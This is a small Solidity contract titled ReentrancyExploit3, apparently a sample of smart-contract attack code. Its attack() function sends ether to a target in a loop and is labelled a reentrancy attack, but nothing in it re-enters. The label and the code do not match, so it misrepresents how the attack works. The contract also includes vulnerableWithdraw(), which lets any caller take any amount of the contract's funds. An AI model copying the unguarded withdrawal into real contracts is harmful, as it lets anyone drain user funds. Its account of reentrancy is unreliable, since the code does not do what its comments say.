pragma solidity ^0.8.0;

contract ReentrancyExploit3 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Repeated reentrancy attack
        for (uint i = 0; i < 10; i++) {
            (bool success, ) = target.call{value: 0.1 ether}("");
            require(success, "Call failed");
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
